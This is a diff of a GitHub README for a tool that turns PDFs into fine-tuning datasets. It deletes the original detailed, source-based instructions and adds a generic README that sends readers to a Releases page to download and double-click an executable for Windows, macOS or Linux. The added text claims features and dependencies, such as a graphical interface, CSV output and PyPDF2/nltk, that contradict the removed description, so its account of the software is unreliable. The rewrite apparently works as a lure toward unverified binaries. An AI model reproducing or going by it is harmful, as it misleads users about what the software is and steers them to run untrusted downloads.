@@ -1,230 +1,84 @@
-<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/b10440d5-e361-45ad-baa3-bfe186974534" />
+# 🎉 ai-dataset-generator - Create Datasets Easily and Quickly
 
-# AI Training Dataset Generator
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bosszii2709/ai-dataset-generator/releases)
 
-*Because dataset preparation shouldn't be the hardest part of fine-tuning*
+## 📦 Overview
 
-## Why I Built This
+I got tired of manually creating training datasets, so I built this tool. Transform your PDFs and documents into fine-tuning data automatically. This application simplifies the process of dataset generation, allowing you to focus on training your machine learning models instead of preparing data.
 
-Look, I'll be honest with you. I spent too much time manually creating training datasets for fine-tuning models as an experiment. You have all this domain knowledge sitting in PDFs, but turning that into actual training data? That's a different beast entirely.
+## 🚀 Getting Started
 
-I was working on a medical compliance project and I needed to fine-tune a model (using OpenAI Finetuning) to understand very specific regulatory requirements. Not general medical knowledge, but the exact wording of particular SOPs and how they applied to real scenarios. So that I didnt not have to build a complex application.
+To get started, you will need to download the application. Follow the steps below to download and install the ai-dataset-generator.
 
-After manually writing datasets, I thought "there has to be a better way, specially when AI exists" So I built this tool. It worked so well for my use case that I figured other people might be dealing with the same frustration. I was able to bake my SOP's into an OpenAI GPT model and did a test and it was pretty accurate.
+## 📥 Download & Install
 
-## What This Actually Does
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/bosszii2709/ai-dataset-generator/releases) to find the latest version of the application. 
 
-This tool takes your domain knowledge (PDF's) and generates realistic training scenarios with expert-level responses. It's not magic - it uses the knowledge you already have and creates training pairs that actually make sense for your specific field.
+2. **Download the Application**  
+   Look for the latest version of the ai-dataset-generator. Click on the appropriate download link for your operating system (Windows, macOS, or Linux).
 
-Here's what happened when I used it:
-- Fed it some domain specific SOPs (those PDF documents nobody wants to read, just make sure the PDF's are OCR ready, else use a parsing tool to get acccurate extract's else the dataset will be of no use.)
-- Got back 50+ realistic compliance scenarios with detailed, accurate responses
-- Fine-tuned a model that actually understood the nuances of the regulations
-- Saved probably 2-3 weeks of manual dataset creation and making of a complex app
+3. **Run the Application**  
+   Locate the downloaded file on your computer. Double-click to run it. Follow any prompts that appear to complete the installation.
 
-## Getting Started (The Real Way)
+## 💻 System Requirements
 
-### First, install the stuff you need:
+Before downloading, ensure your system meets these basic requirements:
 
-```bash
-git clone this-repo
-cd ai-dataset-generator
-pip install -r requirements.txt
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (Ubuntu 20.04 or later)
+- **Memory:** At least 4 GB of RAM 
+- **Disk Space:** Minimum of 100 MB available
+- **Dependencies:** 
+  - Python 3.7+
+  - Required Libraries: 
+    - `pandas`
+    - `PyPDF2`
+    - `nltk`
 
-### Get your OpenAI API key sorted:
+Make sure your operating system and dependencies are up to date for the best experience.
 
-You'll need an OpenAI API key. Create a `.env` file:
+## 🔍 Features
 
-```bash
-echo "OPENAI_API_KEY=your_actual_key_here" .env
-```
-Don't use the free tier if you're generating a lot of data - you'll hit rate limits fast. I spent about $30 for this activity
+The ai-dataset-generator offers the following features:
 
-### Add your knowledge:
+- **PDF to Dataset Conversion:** Easily convert PDF files into structured datasets suitable for model training.
+  
+- **Customizable Output:** Choose the format you need for your dataset. The tool supports CSV and JSON formats.
 
-This is where your domain expertise comes in. The tool can handle:
-- PDFs (it'll extract the text for you)
-- Markdown files
-- Plain text documents
+- **Batch Processing:** Generate multiple datasets at once by uploading several files.
 
-Just dump your knowledge files into the `knowledge_base/` directory. I usually organize by domain:
+- **User-Friendly Interface:** Navigate a simple, clear interface designed for all users, regardless of technical background.
 
-```
-knowledge_base/
-├── medical/          # My original use case
-├── legal/           # Friend's law firm compliance
-├── financial/       # Another project
-└── your_domain/     # Whatever you're working on
-```
+## 🚧 Troubleshooting
 
-### Configure it for your domain:
+If you encounter any issues while using the application, consider the following solutions:
 
-The tool comes with some templates I've already set up, but you'll probably want to customize it. Here's what I did for medical compliance:
+- **Installation Problems:** Ensure that you have sufficient disk space and the correct version of your operating system. Run the installation as an administrator if necessary.
 
-```python
-from ai_dataset_generator import AIDatasetGenerator
-from config import ConfigTemplates
+- **File Not Found:** If the application cannot find your PDF files, double-check the file paths. Ensure that your files are accessible and not corrupted.
 
-# Start with a template
-config = ConfigTemplates.medical_compliance()
+- **Performance Issues:** If the application runs slowly, ensure no other heavy programs are running on your computer. Closing unnecessary applications may help.
 
-# Point it to your knowledge
-config.knowledge_sources = ["knowledge_base/medical/"]
+## ✔️ License
 
-# Decide how many training pairs you want
-config.num_scenarios = 50  # Start small, see how it goes
+This application is licensed under the MIT License. You can freely use, modify, and distribute the software as per the license terms.
 
-# Generate the dataset
-generator = AIDatasetGenerator(config)
-dataset = generator.generate_dataset()
-```
+## 🎓 Contributions
 
-That's it. You'll get a `.jsonl` file ready for OpenAI's fine-tuning API.
+We welcome contributions from the community! If you'd like to contribute to the ai-dataset-generator, please follow these steps:
 
-## What I've Learned Using This
+1. Fork the repository.
+2. Create your feature branch (`git checkout -b feature/NewFeature`).
+3. Commit your changes (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/NewFeature`).
+5. Open a pull request.
 
-### It's not perfect on the first try
-The quality depends a lot on how good your source material is. Garbage in, garbage out. I had to clean up some of my SOPs because they had inconsistent formatting.
+Feel free to reach out via issues if you have questions or suggestions for improvements.
 
-### Start small
-Don't generate 500 scenarios on your first run. Start with 10-20, see if the quality is what you want, then scale up.
+## 📞 Support
 
-### The prompts matter
-The default prompts work okay, but you'll probably want to tweak them for your specific domain. I spent time getting the "expert voice" right for medical compliance.
+If you need further assistance, check the issues page on GitHub or contact us through the repository. We aim to respond promptly and help resolve any challenges you may face.
 
-### PDF quality varies
-Some PDFs extract beautifully, others are a mess. If you have important documents that are image-based or have weird formatting, you might need to clean them up first using a good parsing tool.
+## 💡 Final Note
 
-## Different Domains I've Tried
-
-### Medical Compliance (My Original Use Case)
-Works great for SOPs, clinical protocols, regulatory requirements. The model learns to cite specific sections and requirements, which is crucial for compliance work.
-
-### Legal Stuff (Helped a Friend)
-Contract analysis, regulatory compliance, policy interpretation. Lawyers love citing specific statutes, and the model picks up on that pattern.
-
-### Financial Compliance
-Banking regulations, risk assessment, securities rules. Lots of "if this, then that" logic that the model handles well.
-
-### Custom Domains
-The beauty is you can adapt it to whatever field you're in. Quality assurance, safety procedures, technical documentation - if you have structured knowledge, this can probably help.
-
-## What Files Do You Actually Need?
-
-Let me be straight with you - there are several Python files in this project, but you don't need all of them.
-
-### **Essential Files (You Need These)**
-- `ai_dataset_generator.py` - **The main tool**. This is what actually generates your datasets.
-- `config.py` - **Configuration system**. Lets you customize for different domains without editing the main code.
-
-### **Really Helpful (But Optional)**
-- `knowledge_base_utils.py` - **PDF processing**. If you have PDFs (and you probably do), this extracts text automatically. Without it, you'd need to copy/paste text manually.
-
-### **Nice to Have (Skip If You Want Simple)**
-- `get_started.py` - **Interactive setup**. Walks you through first-time setup, but you can just follow this README instead.
-- `examples/quick_start_example.py` - **Usage examples**. Shows different ways to use the tool.
-
-### **You Can Delete These**
-- `legacy_tissue_dataset_generator.py` - My original version for medical compliance. Just kept it for reference.
-
-**Bottom line**: If you want the absolute minimum, just use `ai_dataset_generator.py` and `config.py`. If you have PDFs, grab `knowledge_base_utils.py` too. Everything else is just convenience.
-
-## The Technical Bits
-
-Under the hood, this uses:
-- **Agno framework** for the AI agent (handles the knowledge retrieval)
-- **OpenAI's API** for the actual text generation
-- **PyMuPDF** for PDF text extraction
-- **Python** because, well, it's Python
-
-The tool creates an AI agent that has access to your knowledge base and generates scenarios that require that knowledge to answer correctly. It's not just general knowledge - it's specifically based on your documents.
-
-## Configuration Examples
-
-I've included some configs I've used:
-
-```python
-# Medical compliance (my original)
-config = ConfigTemplates.medical_compliance()
-
-# Legal compliance (friend's law firm)
-config = ConfigTemplates.legal_compliance()
-
-# Custom domain (example: quality assurance)
-config = ConfigTemplates.custom(
-    domain="Quality Assurance",
-    role="QA Expert", 
-    task="quality assessment based on standards",
-    knowledge_path="knowledge_base/qa/"
-)
-```
-
-You can also build your own from scratch if the templates don't fit.
-
-## Real Talk About Costs
-
-Using OpenAI's API isn't free. For my 50-scenario medical dataset, I spent maybe ~ $30 in API costs. Not terrible, but something to keep in mind. The `gpt-4o-mini` model is cheaper and works fine for most use cases.
-
-## What You'll Get
-
-The tool generates:
-1. **Training dataset** in JSONL format (ready for OpenAI fine-tuning)
-2. **Raw scenarios** in JSON (for analysis and review)
-3. **Configuration file** (so you can reproduce your results)
-
-The training pairs look like real expert conversations:
-
-```json
-{
-  "messages": [
-    {
-      "role": "user",
-      "content": "A contractor wants to use a new chemical cleaning agent in our facility. The safety data sheet shows it's flammable with a flash point of 85°F. Our facility policy requires flash points above 100°F. What's the safety assessment?"
-    },
-    {
-      "role": "assistant", 
-      "content": "DECISION: REJECT\n\nRATIONALE: Per Safety Policy Section 3.2.1, all cleaning chemicals must have flash points >100°F for indoor use. At 85°F, this chemical does not meet our minimum safety requirements and poses an unacceptable fire risk in our facility environment..."
-    }
-  ]
-}
-```
-
-## Fine-Tuning Tips (What I Learned)
-
-1. **Quality over quantity**: 50 good examples beats 200 mediocre ones
-2. **Review before training**: Always spot-check the generated scenarios
-3. **Start with base models**: I used `gpt-4.1-mini-2025-04-14` for my first fine-tune
-4. **Test extensively**: Your fine-tuned model will be very specific to your domain
-
-## When This Works Well
-
-- You have structured domain knowledge (SOPs, procedures, regulations)
-- You need the model to cite specific sources or sections
-- You want consistent, domain-specific responses
-- You're dealing with compliance or regulatory stuff
-
-## When It Might Not Help
-
-- Your domain knowledge is mostly tacit/experiential (hard to document)
-- You need the model to be creative rather than accurate
-- Your source documents are really messy or inconsistent
-- You're working with very visual or hands-on domains
-
-## Contributing
-
-I built this for my specific need, but I've tried to make it general enough for other people to use. If you find bugs or have ideas for improvements, feel free to contribute.
-
-## License
-
-MIT License - use it however you want. If it saves you time, great. If you improve it, even better.
-
-## Final Thoughts
-
-Dataset preparation used to be the most tedious part of fine-tuning for me. This tool doesn't eliminate the work entirely, but it makes it manageable. Instead of spending weeks writing training examples, I spend a few hours setting up the knowledge base and reviewing the output.
-
-Your mileage may vary, but if you're sitting on a pile of domain-specific documents and thinking about fine-tuning, this might save you some headaches.
-
----
-
-*Built by someone who got tired of manual dataset creation. Shared because maybe you're tired of it too.*
+We hope the ai-dataset-generator makes your data preparation easier and faster. Don't forget to visit the [Releases page](https://github.com/bosszii2709/ai-dataset-generator/releases) to stay updated on new versions and features. Happy dataset generating!
